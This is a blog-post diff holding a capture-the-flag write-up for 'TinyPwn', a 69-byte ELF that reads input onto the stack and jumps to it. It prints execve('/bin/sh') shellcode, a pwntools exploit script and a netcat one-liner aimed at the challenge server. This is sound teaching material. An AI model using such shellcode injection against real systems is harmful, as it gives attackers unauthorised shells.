@@ -1,0 +1,152 @@
+---
+layout: post
+date: 2023-09-25 12:00:00 +0200
+title: "TinyPwn"
+excerpt_separator: <!--more-->
+---
+
+# TinyPwn
+
+In this challenge, we are given a very small ELF file (only 69 bytes long).
+I was clearly inspired by this following article which I strongly ecourage reading : https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html.
+The program waits for an input from the user and then immediatly leads to a segfault. The goal is to find the proper input.
+
+## Understanding the ELF structure
+
+As usual, let's try to open and disassemble this file in gdb.
+
+```
+"/home/micronoyau/Documents/vsctf/tinypwn/tinypwn": not in executable format: file format not recognized
+```
+
+Ooops, gdb does not understand the file structure. But the file is still an elf :
+```
+[micronoyau@pwnixos:~/Documents/vsctf/tinypwn]$ file tinypwn
+tinypwn: ELF 32-bit invalid byte order (SYSV)
+```
+
+Lets do a quick hexdump to get more insight into this file :
+
+```
+[micronoyau@pwnixos:~/Documents/vsctf/tinypwn]$ hexdump -C tinypwn
+00000000  7f 45 4c 46 01 00 00 00  00 00 00 00 00 00 01 00  |.ELF............|
+00000010  02 00 03 00 34 00 01 00  34 00 01 00 04 00 00 00  |....4...4.......|
+00000020  2f 62 69 6e 2f 73 68 00  34 00 20 00 01 00 00 00  |/bin/sh.4. .....|
+00000030  00 00 00 00 6a 03 58 bb  00 00 00 00 89 e1 6a 0d  |....j.X.......j.|
+00000040  5a cd 80 ff e4                                    |Z....|
+00000045
+```
+
+There is the string `/bin/sh` at offset 32. Most likely we are going to need that at some point.
+
+The ELF header is the following (please check https://en.wikipedia.org/wiki/Executable_and_Linkable_Format for more details):
+
+```
+[micronoyau@pwnixos:~/Documents/vsctf/tinypwn]$ readelf -h tinypwn
+ELF Header:
+  Magic:   7f 45 4c 46 01 00 00 00 00 00 00 00 00 00 01 00 
+  Class:                             ELF32
+  Data:                              none
+  Version:                           0
+  OS/ABI:                            UNIX - System V
+  ABI Version:                       0
+  Type:                              EXEC (Executable file)
+  Machine:                           Intel 80386
+  Version:                           0x10034
+  Entry point address:               0x10034
+  Start of program headers:          4 (bytes into file)
+  Start of section headers:          1852400175 (bytes into file)
+  Flags:                             0x68732f
+  Size of this header:               52 (bytes)
+  Size of program headers:           32 (bytes)
+  Number of program headers:         1
+  Size of section headers:           0 (bytes)
+  Number of section headers:         0
+  Section header string table index: 0
+readelf: Warning: possibly corrupt ELF file header - it has a non-zero section header offset, but no section headers
+```
+
+`readelf` is warning us that the ELF file is potentially corrupt because the section headers offset (`e_shoff`) is `0x2f62696e=1852400175`, but the file specifies there is no section headers.
+Ok, we can clearly see there is an overlap between the ELF header and some other data.  More exactly, we can see the program header offset (`e_phoff`) is 4, but the header is 52 bytes long (`e_ehsize`). Lets take a look at the list of segments :
+
+```
+[micronoyau@pwnixos:~/Documents/vsctf/tinypwn]$ readelf -l tinypwn
+readelf: Warning: possibly corrupt ELF file header - it has a non-zero section header offset, but no section headers
+
+Elf file type is EXEC (Executable file)
+Entry point 0x10034
+There is 1 program header, starting at offset 4
+
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  LOAD           0x000000 0x00010000 0x00030002 0x10034 0x10034 R   0x6e69622f
+```
+
+The only segment encompasses the entire file and even more (`Offset=0`, `Filesize=0x10034`) at the address `0x10000`. We saw previously in the ELF header that the entrypoint is `0x10034`. Therefore the first instruction is the `0x34=52`th byte in file, right after the end of the header.
+Lets disassemble the remaining portion after the header :
+
+```
+0:  6a 03                   push   0x3
+2:  58                      pop    eax
+3:  bb 00 00 00 00          mov    ebx,0x0
+8:  89 e1                   mov    ecx,esp
+a:  6a 0d                   push   0xd
+c:  5a                      pop    edx
+d:  cd 80                   int    0x80
+f:  ff e4                   jmp    esp
+```
+
+Essentially, this does a syscall to `read` (system call number `eax=3`) on stdin (file descriptor `ebx=0`) and stores the result on the stack (`ecx=esp`). We can read up to `edx=0xd=13` characters. Next, it jumps on top of the stack.
+
+The exploit is easy : we just need to input a shellcode to perform a syscall to execve. We know /bin/sh has offset `0x20` in file, so its address in memory is `0x10020`.
+
+```
+0:  b0 0b                   mov    al,0xb
+2:  bb 20 00 01 00          mov    ebx,0x10020
+7:  31 c9                   xor    ecx,ecx
+9:  31 d2                   xor    edx,edx
+b:  cd 80                   int    0x80 
+```
+
+The corresponding shellcode is `\xb0\x0b\xbb\x20\x00\x01\x00\x31\xc9\x31\xd2\xcd\x80`. The null bytes are not a problem because the `read` syscall does not stop until it reaches the end of the buffer or an EOF. But in the heat of the action we forgot this detail and tried to modify this shellcode to remove any `\x00`.
+
+We did not find any shellcode less than 13 bytes to setup properly every register. Instead, we implemented the exact same syscall but changed `edx` to allow for more room :
+
+```
+0:  66 ba 10 10             mov    dx,0x1010
+4:  b0 03                   mov    al,0x3
+6:  cd 80                   int    0x80
+```
+
+\x66\xBA\x10\x10\xB0\x03\xCD\x80
+
+Then, all registers are set up accordingly
+```
+0:  6a 0b                   push   0xb
+2:  58                      pop    eax
+3:  66 bb 02 10             mov    bx,0x1002
+7:  c1 e3 04                shl    ebx,0x4
+a:  31 c9                   xor    ecx,ecx
+c:  31 d2                   xor    edx,edx
+e:  cd 80                   int    0x80
+```
+
+To account for the padding introduced by this method (at the time of the syscall in the first step, `eip` is somewhere above the stack pointer), we add some NOP instructions between both shellcodes, as shown in this radare2 dump right after the syscall :
+![](<r2.png>)
+
+Putting every piece together and using pwntools :
+
+```
+from pwn import *
+
+conn = remote('vsc.tf', 3026)
+conn.sendline('\x66\x81\xC2\x01\x01\xB0\x03\xCD\x80\n\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6A\x0B\x58\x66\xBB\x02\x10\xC1\xE3\x04\x31\xC9\x31\xD2\xCD\x80')
+conn.interactive()
+```
+
+![](<expl_flag.png>)
+
+Note that, to come back to the beginning of the discussion, that our method is overkill compared to a more optimal solution since we don't need to take special care of NULL bytes :
+```
+echo -ne '\xb0\x0b\xbb\x20\x00\x01\x00\x31\xc9\x31\xd2\xcd\x80\ncat flag.txt\n' | nc vsc.tf 3026
+```
